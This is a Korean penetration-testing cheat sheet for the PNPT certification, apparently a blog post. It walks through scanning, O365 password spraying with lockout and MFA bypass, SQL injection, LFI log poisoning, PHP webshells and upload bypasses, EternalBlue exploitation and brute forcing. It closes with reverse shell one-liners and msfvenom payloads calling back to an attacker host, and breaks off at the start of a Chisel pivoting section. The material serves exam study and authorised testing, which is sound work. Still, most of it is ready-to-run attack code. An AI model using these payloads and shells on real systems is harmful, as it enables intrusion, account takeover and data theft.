# 외부 침투 테스트 치트시트 (PNPT)

이 글은 TCM Security의 PNPT(Practical Network Penetration Tester) 자격증 취득을 위한 외부 침투 테스트 기법 치트시트 이다

실제 시험과 현업 침투 테스트에서 사용되는 흐름 그대로 단계별로 정리하였다

---

## 외부 침투 공격 흐름

외부 침투는 OSINT에서 수집한 정보를 기반으로 실제 공격을 수행하는 단계이다

> ※OSINT에 대한 내용은 여기에 정리 해 두었다 https://unknown08.tistory.com/61

```
[OSINT 완료 → 이메일 목록, 서브도메인, 유출 자격증명 확보]
         ↓
1단계. 스캐닝 및 열거
  대상의 공격 표면 전체 파악
  (Nmap, Nessus, Nikto, Gobuster ...)
         ↓
[열린 포트, 서비스 버전, 웹 디렉토리 파악]
         ↓
2단계. 로그인 포털 공격
  수집한 이메일과 자격증명으로 외부 포털 공격
  (o365spray, TREVORspray, MSOLSpray, hydra ...)
         ↓
[계정 탈취 or 내부망 접근 포인트 확보]
         ↓
3단계. 웹 애플리케이션 공격
  발견된 웹 서비스의 취약점 탐색 및 익스플로잇
  (Burp Suite, sqlmap, 파일 업로드, LFI ...)
         ↓
[RCE or 크리덴셜 탈취]
         ↓
4단계. 서비스 취약점 공격
  노출된 서비스(FTP, SSH, SMB, RDP 등)의 취약점 공격
  (searchsploit, hydra, EternalBlue ...)
         ↓
[초기 접근(Foothold) 확보]
         ↓
-----내부 침투-----
         ↓
5단계. 내부망 피벗
  획득한 쉘에서 내부 네트워크로 이동
  (Chisel, sshuttle, SSH 터널링, proxychains ...)
         ↓
[내부망 접근 → AD 공격 단계로 이동]
```

외부 침투에선 보안 관리가 철저 하기 때문에 RCE가 나오는 경우는 드물다

대부분은 유출된 자격증명으로 로그인 포털을 뚫거나 약한 비밀번호를 스프레이해서 내부로 들어가는 경우가 많다

---

## 1단계 : 스캐닝 및 열거

스캐닝 단계에선 대상의 열린 포트, 실행 중인 서비스, 웹 디렉토리를 파악하는것이 목표이다

### 1-1 : Nmap — 포트 스캐닝

Nmap은 외부 침투에서 가장 먼저 실행하는 필수 도구다

열린 포트와 서비스 버전을 파악해 이후 공격 벡터(경로)를 결정한다

**사용 조건:**
1. 대상 IP 또는 도메인 보유
2. Kali Linux (기본 탑재)

**공격 흐름:**
1. 빠른 초기 스캔 → 상위 1000개 포트 열거
2. 전체 TCP 포트 스캔 → 비표준 포트 서비스 발견
3. 발견된 포트에 서비스 버전 + 스크립트 스캔
4. UDP 스캔 → SNMP, TFTP 등 숨겨진 서비스 발견
5. 취약점 스크립트 스캔 → 알려진 CVE 확인

**명령어:**

```bash
# 1단계: 빠른 초기 스캔
nmap -sS -Pn --top-ports 1000 -oA initial TARGET

# 2단계: 전체 TCP 포트 스캔 (필수!)
nmap -sS -Pn -p- -T4 -oA full_tcp TARGET

# 3단계: 발견된 포트에 서비스 버전 + 기본 스크립트
nmap -sC -sV -Pn -p 21,22,80,443,445,3389 -oA services TARGET

# 4단계: UDP 스캔
nmap -sU -Pn --top-ports 250 -oA udp TARGET

# 5단계: 취약점 스크립트
nmap -sV --script vuln -Pn -p 21,22,80,443,445 -oA vuln TARGET
```

**핵심 옵션 설명:**

| 옵션 | 설명 |
|------|------|
| `-sS` | TCP SYN 스캔 (빠르고 은밀, root 권한 필요) |
| `-sT` | TCP Connect 스캔 (root 권한 없을 때) |
| `-sU` | UDP 스캔 |
| `-sC` | 기본 스크립트 실행 (--script=default) |
| `-sV` | 서비스 버전 탐지 |
| `-Pn` | 호스트 탐지 생략 (외부 침투 필수, ICMP 차단 환경) |
| `-p-` | 전체 65535 포트 |
| `-p 80,443` | 특정 포트 지정 |
| `--top-ports` | 상위 N개 포트 |
| `-T4` | 타이밍 4 (빠름, 외부 침투 권장) |
| `-oA` | 전체 형식 동시 저장 (강력 권장) |
| `-A` | -sC -sV -O --traceroute 통합 |

**서비스별 주요 NSE 스크립트:**

```bash
# EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 TARGET

# Heartbleed
nmap --script ssl-heartbleed -p 443 TARGET

# FTP 익명 로그인
nmap --script ftp-anon -p 21 TARGET

# 웹 디렉토리 열거
nmap --script http-enum TARGET

# SMB 전체 취약점
nmap --script smb-vuln-* -p 445 TARGET
```

**searchsploit 연동:**

```bash
# Nmap XML과 searchsploit 연동 (핵심 워크플로우)
nmap -sV -Pn -p- -oX scan.xml TARGET
searchsploit --nmap scan.xml
```

> ※외부 침투에서는 -Pn 옵션은 거의 필수이다 (ICMP가 차단된 환경이 대부분 = 방화벽 차단)
>
> ※-oA로 저장하면 나중에 searchsploit --nmap과 연동 가능하다

---

### 1-2 : Nessus — 자동 취약점 스캐너

Nessus는 External Pentest Playbook(외부 침투 테스트 절차서)과정에서 가장 먼저 실행하는 자동 취약점 스캐너이다

알려진 CVE와 설정 취약점을 자동으로 탐지해준다

**사용 조건:**
1. Nessus Essentials (무료) 또는 Professional 설치
2. 대상 IP 또는 IP 대역 보유

**공격 흐름:**
1. New Scan → Advanced Scan 선택
2. 대상 IP 입력
3. Discovery > Port 설정: 1-65535 (전체 포트 필수!)
4. 웹 서버 발견 시 웹 애플리케이션 스캔 활성화
5. 스캔 실행 → Critical/High 우선 검토
6. 결과 내보내기 → 보고서에 포함

**중요 설정:**

```
Scan Settings:
  Ports: 1-65535       → 전체 포트 스캔 (기본값 변경 필수)
  "Ping the Remote Host" 비활성화  → 외부 침투에서 ICMP 오탐 방지

결과 내보내기:
  PDF / HTML / CSV / Nessus 형식 지원
```

> ※CDN 뒤의 호스트는 모든 포트가 열린 것처럼 표시될 수 있다 → 수동 검증 필요
>
> ※CDN = 실제 서버 앞에 세워놓는 대리 서버이며 스캔하면 실제 서버가 아닌 CDN 정보가 나와서 문제가 생길 수 있다

---

### 1-3 : Nikto — 웹 서버 취약점 스캐너

Nikto는 6,700개 이상의 위험 파일, 보안 헤더 누락, 기본 자격증명, XSS, SQLi 등을 자동 검사하는 웹 스캐너이다

**사용 조건:**
1. Kali Linux (기본 탑재)
2. 대상 웹 서버 URL

**공격 흐름:**
1. Nmap에서 웹 서비스 발견 (80, 443, 8080 등)
2. Nikto로 웹 서버 취약점 자동 스캔
3. 발견된 취약점 수동 검증
4. 보고서에 포함

**명령어:**

```bash
# 기본 스캔
nikto -h http://TARGET

# HTTPS 스캔
nikto -h https://TARGET -ssl -p 443

# 여러 포트 동시
nikto -h TARGET -p 80,443,8080,8443

# Burp Suite 프록시 경유
nikto -h http://TARGET -useproxy http://127.0.0.1:8080

# 결과 파일 저장
nikto -h https://TARGET -ssl -o nikto_report.html -Format htm

# 속도 제한 (IDS 우회)
nikto -h http://TARGET -Pause 3
```

**옵션 설명:**

| 옵션 | 설명 |
|------|------|
| `-h` | 대상 호스트 |
| `-ssl` | SSL 강제 |
| `-p` | 포트 (쉼표로 다중) |
| `-useproxy` | 프록시 사용 |
| `-o` | 출력 파일 |
| `-Format` | 출력 형식 (csv, htm, json, xml, txt) |
| `-Pause` | 테스트 간 대기 시간 |
| `-Tuning` | 테스트 유형 선택 |

> ※Nikto는 매우 시끄러운 도구라 IDS/IPS에 쉽게 탐지된다
>
> ※시험 환경에서는 탐지 여부가 감점 요소가 아니지만 실무에서는 주의

---

### 1-4 : Gobuster — 디렉토리/서브도메인 브루트포스

Gobuster는 웹 디렉토리, 파일, 서브도메인, 가상 호스트를 브루트포스로 발견하는 도구이다

**사용 조건:**
1. Kali Linux (기본 탑재)
2. 대상 URL 또는 도메인
3. 워드리스트 보유 (/usr/share/wordlists/)

**공격 흐름:**
1. Nmap에서 웹 서비스 발견
2. Gobuster dir로 숨겨진 디렉토리/파일 탐색
3. 로그인 페이지, 관리자 패널, API 엔드포인트 발견
4. 발견된 경로를 추가 공격 대상으로 설정

**DIR 모드 - 디렉토리/파일:**

```bash
# 기본 디렉토리 스캔
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# 파일 확장자 포함 + 재귀 (PNPT 권장)
gobuster dir -u http://TARGET \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,asp,aspx,jsp -t 50 -o dir_results.txt \
  --recursive

# HTTPS + SSL 무시
gobuster dir -u https://TARGET -w wordlist.txt -k

# 인증 필요한 경우
gobuster dir -u http://TARGET -w wordlist.txt -U admin -P password
```

**옵션 설명:**

| 옵션 | 설명 |
|------|------|
| `-u` | 대상 URL |
| `-w` | 워드리스트 |
| `-x` | 파일 확장자 (쉼표로 다중) |
| `-t` | 스레드 수 (기본 10, 50 권장) |
| `-o` | 결과 파일 |
| `-k` | SSL 인증서 무시 |
| `-s` | 허용 상태코드 (기본 200,204,301,302,307,401,403) |
| `-b` | 제외 상태코드 |
| `-l` | 응답 길이 표시 |
| `--recursive` | 발견된 디렉토리 재귀 스캔 (탐지 위험 증가) |

**DNS 모드 - 서브도메인:**

```bash
gobuster dns -d TARGET.com \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 50 -o dns_results.txt
```

**VHOST 모드 - 가상 호스트:**

```bash
gobuster vhost -u http://TARGET.com \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 50 -o vhost_results.txt
```

> ※재귀 모드를 통해 자세한 디렉토리 스캔을 할 수 있다(트래픽 증가, 탐지 위험 증가 같은 문제들도 있음)

---

## 2단계 : 로그인 포털 공격

로그인 포털 공격 단계에선 OSINT에서 수집한 이메일 목록과 유출 자격증명으로 외부 로그인 포털에 접근하는것이 목표이다

O365, OWA, VPN 포털 등 인터넷에 노출된 로그인 서비스를 공격한다

### 2-1 : o365spray — O365 사용자 열거 및 비밀번호 스프레이

o365spray는 Microsoft O365를 대상으로 사용자 열거와 비밀번호 스프레이를 수행하는 도구이다

**사용 조건:**
1. 대상이 O365를 사용해야 함
2. 유효한 이메일 목록 보유
3. Python 환경

**공격 흐름:**
1. 도메인이 O365 사용 여부 확인
2. 유효 사용자 열거 (계정 잠금 없이 가능)
3. 비밀번호 스프레이 (잠금 정책 확인 후 안전하게 실행)
4. 성공한 계정으로 이메일, SharePoint, VPN 등 접근 시도

**설치:**

```bash
git clone https://github.com/0xZDH/o365spray.git
cd o365spray && pip install -r requirements.txt
```

**명령어:**

```bash
# 1단계: O365 사용 여부 확인
o365spray --validate --domain target.com

# 2단계: 유효 사용자 열거
o365spray --enum -U usernames.txt --domain target.com

# 3단계: 비밀번호 스프레이
o365spray --spray -U valid_users.txt -p 'Winter2025!' --domain target.com \
  --count 1 --lockout 15

# 여러 비밀번호 + 잠금 보호
o365spray --spray -U valid_users.txt -P passwords.txt --domain target.com \
  --count 1 --lockout 30 --safe 10
```

**옵션 설명:**

| 옵션 | 설명 |
|------|------|
| `--validate` | 도메인 O365 확인 |
| `--enum` | 사용자 열거 |
| `--spray` | 비밀번호 스프레이 |
| `-U` | 사용자 목록 파일 |
| `-P` | 비밀번호 목록 파일 |
| `-p` | 단일 비밀번호 |
| `--count N` | 잠금 전 시도 횟수 (1 권장) |
| `--lockout MIN` | 잠금 리셋 대기 시간 (분) |
| `--safe N` | N개 계정 잠금 시 자동 중지 |
| `--sleep SEC` | 라운드 간 대기 |
| `--jitter` | 대기 시간 변동 (탐지 우회) |

> ※잠금 정책이 5회라면 4회만 시도하고 잠금 기간 대기해야 한다 (계정 잠금이 발생하면 업무가 중단됨)

---

### 2-2 : TREVORspray — SSH 프록시 IP 로테이션 스프레이

TREVORspray는 SSH 프록시를 통한 IP 로테이션으로 Azure Smart Lockout을 우회할 수 있는 도구이다

PNPT External Pentest Playbook 과정에서 직접 가르치는 도구이다

> ※ Azure Smart Lockout는 같은 IP의 지속적인 로그인 실패를 차단하지만 IP로테이션을 통해 차단 우회가 가능해진다

**사용 조건:**
1. SSH 접근 가능한 외부 서버 보유 (AWS EC2 Free Tier 활용 가능)
2. 유효한 이메일 목록
3. Python 환경

**공격 흐름:**
1. AWS EC2 등 외부 SSH 서버 준비 (IP 로테이션용)
2. 도메인 정찰 (MX, TXT, 테넌트 ID, SharePoint URL 확인)
3. 이메일 목록으로 스프레이 실행 (SSH 프록시 경유)
4. Smart Lockout 우회 확인

**설치:**

```bash
pip3 install trevorspray
```

**명령어:**

```bash
# 도메인 정찰 (MFA 우회 경로 확인)
trevorspray --recon corp.com

# 기본 스프레이
trevorspray -u valid_emails.txt -p 'Welcome123' --delay 5

# SSH 프록시 IP 로테이션 (핵심 기법)
trevorspray -u emails.txt -p 'Winter2025!' --delay 10 \
  --no-current-ip --ssh ubuntu@[EC2-IP] -k ec2.pem

# 여러 SSH 서버 로테이션
trevorspray -u emails.txt -p 'Spring2025!' \
  --ssh ubuntu@1.2.3.4 ubuntu@5.6.7.8 -k hacking.pem \
  --delay 30 --lockout-delay 30 --jitter 10
```

**옵션 설명:**

| 옵션 | 설명 |
|------|------|
| `-u` | 이메일 목록 |
| `-p` | 비밀번호 |
| `--delay` | 요청 간 대기(초) |
| `--ssh` | SSH 프록시 서버 |
| `-k` | SSH 키 파일 |
| `--no-current-ip` | 현재 IP 제외 (본인 IP로 스프레이 방지) |
| `--lockout-delay` | 잠금 발생 시 추가 대기 |
| `--jitter` | 랜덤 지연 변동 |

> ※AWS EC2 Free Tier 인스턴스(Ubuntu)를 SSH 프록시로 설정하면 무료로 IP 로테이션 가능

---

### 2-3 : MFASweep — MFA 미적용 프로토콜 확인

MFASweep는 Microsoft 서비스에서 MFA가 적용되지 않는 레거시 프로토콜을 찾는 도구이다

MFA가 활성화된 계정도 IMAP, SMTP, EWS 등 레거시 프로토콜은 MFA를 우회할 수 있다

> ※MFA = 로그인할 때 비밀번호 외에 추가 인증을 요구하는 시스템
>
> ※레거시 프로토콜 = 옛날에 만들어진 구식 통신 방식 = MFA 없음 → 크리덴셜만 있으면 로그인 가능

**사용 조건:**
1. 유효한 자격증명 보유 (스프레이로 획득한 계정)
2. PowerShell 환경

**공격 흐름:**
1. o365spray로 유효한 자격증명 획득
2. MFASweep로 MFA 미적용 프로토콜 확인
3. 우회 가능한 프로토콜 발견 → 해당 프로토콜로 인증
4. 이메일, 파일, 내부 시스템 접근

**명령어:**

```powershell
Import-Module MFASweep.ps1

# 기본 확인
Invoke-MFASweep -Username user@domain.com -Password Winter2025

# ADFS 포함 전체 확인
Invoke-MFASweep -Username user@domain.com -Password Winter2025 -Recon -IncludeADFS
```

> ※MFA 우회 대상 프로토콜: ActiveSync, EWS, IMAP, SMTP, POP, Graph API, AutoDiscover

---

### 2-4 : 일반 웹 로그인 포털 — Hydra 브루트포스

VPN 포털, OWA, 웹 관리자 패널 등 일반 로그인 폼에 대한 브루트포스이다

**사용 조건:**
1. 대상 로그인 URL
2. 사용자명/이메일 목록
3. 비밀번호 목록 또는 유출된 비밀번호

**공격 흐름:**
1. Gobuster로 로그인 페이지 발견
2. Burp Suite로 로그인 요청 캡처 → 파라미터 확인
3. Hydra 또는 Burp Intruder로 브루트포스
4. 성공 시 → 추가 내부 정보 수집

**Hydra 명령어:**

```bash
# HTTP Form 브루트포스
hydra -L users.txt -P passwords.txt TARGET http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4

# FTP
hydra -L users.txt -P passwords.txt ftp://TARGET

# RDP
hydra -l administrator -P rockyou.txt rdp://TARGET -t 1

# SMB
hydra -L users.txt -P passwords.txt smb://TARGET

# 유출 자격증명 쌍 (user:pass 형식)
hydra -C creds.txt ssh://TARGET
```

**옵션 설명:**

| 옵션 | 설명 |
|------|------|
| `-l` | 단일 사용자명 |
| `-L` | 사용자명 목록 파일 |
| `-p` | 단일 비밀번호 |
| `-P` | 비밀번호 목록 파일 |
| `-C` | user:pass 형식 파일 |
| `-t` | 스레드 수 |
| `-V` | 모든 시도 출력 |
| `-f` | 첫 성공 시 중지 |

---

## 3단계 : 웹 애플리케이션 공격

웹 애플리케이션 공격 단계에선 발견된 웹 서비스의 취약점을 탐색하고 익스플로잇하는것이 목표이다

### 3-1 : Burp Suite — 웹 애플리케이션 테스트

Burp Suite는 웹 애플리케이션 침투 테스트의 핵심 도구로 HTTP 요청/응답과 같은 트래픽을 가로채고 조작한다

**사용 조건:**
1. Kali Linux (Community Edition 무료)
2. 브라우저 프록시 설정 (127.0.0.1:8080)
3. HTTPS 사이트: Burp CA 인증서 설치 필요 (http://burpsuite 접속)

**공격 흐름:**
1. 브라우저 프록시 → Burp 127.0.0.1:8080으로 설정
2. 대상 사이트 탐색 → Proxy > HTTP History에서 요청 확인
3. 의심스러운 요청 우클릭 → Send to Repeater
4. Repeater에서 파라미터 수동 조작 → 취약점 확인
5. 익스플로잇 자동화 필요 시 → Send to Intruder

**Proxy / Intercept:**

```
Intercept is on 토글 → 요청 캡처
Forward   : 요청 전송
Drop      : 요청 차단
Ctrl+R    : Repeater로 전송
Ctrl+I    : Intruder로 전송
```

**Repeater - 수동 테스트:**

```
# SQLi 테스트
id=1 → id=1' (에러 확인)
id=1 → id=1 OR 1=1--

# XSS 테스트
name=test → name=<script>alert(1)</script>

# IDOR 테스트
id=1 → id=2, id=3 (다른 사용자 데이터 접근)

# 인증 우회
admin=false → admin=true
```

**Intruder - 자동화 공격:**

```
공격 유형:
Sniper       → 단일 페이로드, 파라미터 하나씩 테스트 (SQLi/XSS 퍼징)
Pitchfork    → 다중 페이로드 동기 반복 (크리덴셜 쌍 테스트)
Cluster Bomb → 모든 조합 (로그인 브루트포스)

성공 판별:
→ 상태 코드 또는 Content-Length로 이상값 필터링
→ Grep-Match에 "Welcome", "Invalid" 등 키워드 설정
```

**sqlmap 연동:**

```bash
# Burp에서 요청 저장 → sqlmap에서 사용
# HTTP History → 요청 우클릭 → Save Item → request.txt
sqlmap -r request.txt --batch --dbs
```

---

### 3-2 : SQL Injection

SQLi는 사용자 입력이 SQL 쿼리에 그대로 삽입될 때 발생하는 취약점이다

인증 우회, 데이터 추출, OS 명령 실행까지 가능하다

**사용 조건:**
1. SQL 쿼리를 사용하는 웹 애플리케이션
2. 입력값이 필터링되지 않는 파라미터 존재

**공격 흐름:**
1. 파라미터에 ' 또는 " 입력 → SQL 에러 확인
2. 인증 우회 페이로드로 로그인 시도
3. Union 기반으로 DB 구조 파악
4. sqlmap으로 자동화 → 전체 DB 덤프

**인증 우회 페이로드:**

```sql
' OR 1=1--
' OR 1=1#
admin'--
' OR ''='
') OR ('1'='1'--
```

**Union 기반 수동 탐색:**

```sql
' ORDER BY 1--                             -- 컬럼 수 확인 (에러 날 때까지 증가)
' ORDER BY 3--                             -- 3개 컬럼 확인
' UNION SELECT NULL,NULL,NULL--            -- 컬럼 수 맞추기
' UNION SELECT 1,2,3--                     -- 출력 위치 확인
' UNION SELECT username,password,3 FROM users--  -- 데이터 추출
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--  -- 테이블 목록
```

**sqlmap:**

```bash
# 기본 탐지
sqlmap -u "http://TARGET/page.php?id=1" --batch

# Burp 요청 파일에서 (권장)
sqlmap -r request.txt --batch

# 단계적 DB 열거
sqlmap -u URL --dbs --batch                        # DB 목록
sqlmap -u URL -D dbname --tables --batch           # 테이블 목록
sqlmap -u URL -D dbname -T users --columns --batch # 컬럼 목록
sqlmap -u URL -D dbname -T users -C username,password --dump --batch  # 덤프

# OS 쉘 (DBA 권한)
sqlmap -u URL --os-shell

# 파일 읽기
sqlmap -u URL --file-read="/etc/passwd"

# WAF 우회
sqlmap -u URL --tamper=space2comment,randomcase --random-agent --level=3 --risk=2
```

---

### 3-3 : LFI / RFI — 파일 포함 취약점

LFI(Local File Inclusion)는 서버의 로컬 파일을, RFI(Remote File Inclusion)는 원격 파일을 포함시키는 취약점이다

> ※LFI = 서버 내부 파일을 읽는 취약점
>
> ※RFI = 외부 악성 파일을 삽입하여 실행시키는 취약점
>
> ※둘 다 RCE가 가능하지만 LFI는 Log Poisoning 같은 우회 과정이 필요하고 RFI는 바로 RCE가 가능하다

**사용 조건:**
1. 파일 경로가 파라미터로 전달되는 웹 애플리케이션
2. 입력값 필터링이 미흡한 환경

**공격 흐름:**
1. page=, file=, include= 등의 파라미터 확인
2. 경로 순회로 /etc/passwd 접근 시도
3. LFI 확인 시 → PHP 래퍼로 소스 코드 읽기
4. 로그 포이즈닝 or PHP 래퍼로 RCE 시도

**LFI 경로 순회:**

```
../../../etc/passwd
....//....//....//etc/passwd     # 이중 점 필터 우회
..%2f..%2f..%2fetc%2fpasswd      # URL 인코딩 우회

# Windows 대상
..\..\..\windows\win.ini
..%5c..%5cwindows%5cwin.ini
```

**PHP 래퍼:**

```
# 소스 코드 읽기
?page=php://filter/convert.base64-encode/resource=config.php

# 코드 실행
?page=php://input
POST: <?php system('whoami'); ?>

# 인라인 실행
?page=data://text/plain,<?php system($_GET['cmd']); ?>
```

**로그 포이즈닝 → RCE:**

```bash
# 1. Apache 로그에 PHP 코드 삽입
curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/

# 2. LFI로 로그 파일 로드 + 명령 실행
?page=../../../var/log/apache2/access.log&cmd=whoami
```

---

### 3-4 : 파일 업로드 취약점

파일 업로드 취약점은 서버가 업로드 파일을 충분히 검증하지 않아 악성 파일이 실행되는 취약점이다

> ※파일 업로드 취약점 또한 RCE가 가능하지만 정확히는 더 큰 범위에 속한다

**사용 조건:**
1. 파일 업로드 기능이 있는 웹 애플리케이션
2. 업로드된 파일이 서버에서 실행 가능한 경로에 저장

**공격 흐름:**
1. 정상 이미지 업로드 → 저장 경로 확인
2. PHP 웹쉘 직접 업로드 시도
3. 차단 시 → 확장자 우회 기법 적용
4. 업로드 성공 → 업로드 경로 접근 → 명령 실행

**PHP 웹쉘:**

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>

# 간단한 업로드용
GIF89a;<?php system($_GET['cmd']); ?>  # GIF 헤더 추가
```

**확장자 우회 기법:**

```
shell.phtml          # PHP 대체 확장자
shell.php5
shell.php.jpg        # 이중 확장자
shell.php%00.jpg     # Null 바이트 (구버전)
shell.PHP            # 대소문자 우회
```

**MIME 타입 우회 - Burp에서:**

```
Content-Type: application/php → Content-Type: image/jpeg 로 변경
```

**업로드 후 실행:**

```
http://TARGET/uploads/shell.php?cmd=whoami
http://TARGET/uploads/shell.php?cmd=id
http://TARGET/uploads/shell.php?cmd=cat+/etc/passwd
```

---

## 4단계 : 서비스 취약점 공격

서비스 취약점 공격 단계에선 Nmap으로 발견한 노출된 서비스들의 취약점을 직접 익스플로잇하는것이 목표이다

### 4-1 : searchsploit — 오프라인 익스플로잇 검색

searchsploit은 Exploit-DB의 로컬 사본에서 서비스 이름과 버전으로 공개된 익스플로잇을 검색하는 도구이다

**사용 조건:**
1. Kali Linux (기본 탑재)
2. Nmap 서비스 버전 스캔 결과

**공격 흐름:**
1. Nmap -sV로 서비스 버전 확인
2. searchsploit으로 해당 버전 익스플로잇 검색
3. 익스플로잇 코드 복사 후 수정
4. 익스플로잇 실행 → 쉘 획득

**명령어:**

```bash
# 기본 검색
searchsploit apache 2.4
searchsploit wordpress 5.8
searchsploit openssh 7.2

# CVE로 검색
searchsploit --cve 2021-44228

# 익스플로잇 내용 확인
searchsploit -x 39446

# 현재 디렉토리로 복사
searchsploit -m 39446

# Exploit-DB URL 표시
searchsploit -w wordpress 5.0

# DoS/PoC 결과 제외
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"

# Nmap XML 연동 (핵심 워크플로우!)
nmap -sV -Pn -p- -oX scan.xml TARGET
searchsploit --nmap scan.xml
searchsploit --nmap scan.xml -v    # 더 많은 조합
```

> ※검색 시 AND 연산 → 검색어 많으면 결과 감소, 넓게 검색 후 좁히기

---

### 4-2 : FTP (Port 21)

**공격 흐름:**
1. 익명 로그인 시도
2. 익명 로그인 성공 시 → 전체 파일 다운로드
3. 브루트포스 → 자격증명 탈취
4. vsftpd 2.3.4 → 백도어 익스플로잇

**명령어:**

```bash
# 익명 로그인
ftp TARGET   # username: anonymous, password: 공백
nmap --script ftp-anon -p 21 TARGET

# 전체 파일 다운로드
wget -m ftp://anonymous:anonymous@TARGET

# 브루트포스
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET

# vsftpd 2.3.4 백도어 (Metasploit)
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS TARGET
run
```

---

### 4-3 : SSH (Port 22)

**공격 흐름:**
1. 기본 자격증명 시도 (root:root, admin:admin)
2. Hydra로 브루트포스
3. 발견된 개인키 파일(.pem, id_rsa) 사용 시도
4. 개인키에 패스프레이즈 있으면 john으로 크랙

**명령어:**

```bash
# 브루트포스 (스레드 4 권장 — SSH는 느림)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4 -V
hydra -L users.txt -P passwords.txt TARGET ssh -t 4

# 개인키로 접속
chmod 600 id_rsa && ssh -i id_rsa user@TARGET

# 키 패스프레이즈 크랙
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### 4-4 : SMB (Port 445)

**공격 흐름:**
1. Null 세션으로 공유 및 사용자 열거
2. EternalBlue (MS17-010) 취약점 확인
3. 브루트포스 또는 Pass-the-Hash
4. Metasploit으로 익스플로잇

**명령어:**

```bash
# Null 세션 열거
smbclient --no-pass -L //TARGET
enum4linux -a TARGET
crackmapexec smb TARGET -u '' -p '' --shares
crackmapexec smb TARGET -u '' -p '' --users

# EternalBlue 취약점 확인
nmap -p445 --script smb-vuln-ms17-010 TARGET

# EternalBlue 익스플로잇 (Metasploit)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [ATTACKER-IP]
run

# 브루트포스
crackmapexec smb TARGET -u users.txt -p 'Password1' --continue-on-success
```

---

### 4-5 : RDP (Port 3389)

**공격 흐름:**
1. BlueKeep (CVE-2019-0708) 취약점 확인 (Win7, Server 2008)
2. 브루트포스로 자격증명 탈취
3. 획득한 자격증명으로 RDP 접속

**명령어:**

```bash
# BlueKeep 취약점 확인
nmap -p3389 --script rdp-vuln-ms12-020 TARGET
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep   # Metasploit

# 브루트포스
hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://TARGET
crowbar -b rdp -s TARGET/32 -u admin -C rockyou.txt -n 1

# 접속
xfreerdp /u:admin /p:password /v:TARGET /cert:ignore +clipboard
xfreerdp /u:admin /pth:[NTLM-HASH] /v:TARGET /cert:ignore  # Pass-the-Hash
```

---

## 5단계 : 내부망 피벗

내부망 피벗 단계에선 외부에서 획득한 쉘을 통해 내부 네트워크에 접근하는것이 목표이다

이 단계는 PNPT 시험에서 합격자들이 가장 어려워하는 부분이다

> ※피벗 = 외부 서버는 내부 서버랑 연결되기 때문에 뚫은 서버를 이용해 내부망으로 이동하는 것

### 5-1 : 리버스 쉘 획득

내부망 피벗 전에 반드시 안정적인 리버스 쉘이 필요하다

**리버스 쉘 원라이너:**

```bash
# Bash
bash -i >& /dev/tcp/[ATTACKER-IP]/PORT 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("[ATTACKER-IP]",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("[ATTACKER-IP]",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat (mkfifo 버전, -e 없을 때)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER-IP] PORT >/tmp/f

# PowerShell (Windows)
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('[ATTACKER-IP]',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**리스너 설정:**

```bash
nc -lvnp PORT
```

**쉘 업그레이드 - 인터랙티브 TTY:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**msfvenom 페이로드 생성:**

```bash
# Windows 실행파일
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ATTACKER-IP] LPORT=PORT -f exe -o shell.exe

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=PORT -f elf -o shell.elf

# PHP 웹쉘
msfvenom -p php/meterpreter_reverse_tcp LHOST=[ATTACKER-IP] LPORT=PORT -f raw -o shell.php

# ASP/ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER-IP] LPORT=PORT -f aspx -o shell.aspx
```

**Metasploit 리스너:**

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [ATTACKER-IP]
set LPORT PORT
set ExitOnSession false
exploit -j
```

---

### 5-2 : Chisel — HTTP 터널링 피벗

Chisel은 HTTP를 통한 TCP 터널링 도구로 PNPT 시험에서 가장 많이 사용되는 피벗 도구이다

**사용 조건:**
1. 공격자 서버와 피해자 서버 모두 Chisel 바이너리 필요
2. 피해자 → 공격자 방향 HTTP 연결 가능해야 함

**공격 흐름:**
1. 공격자 측에서 Chisel 서버 실행
2. 피해자 머신에 Chisel 클라이언트 업로드 후 실행
3. 공격자 측에 SOCKS5 프록시 생성됨
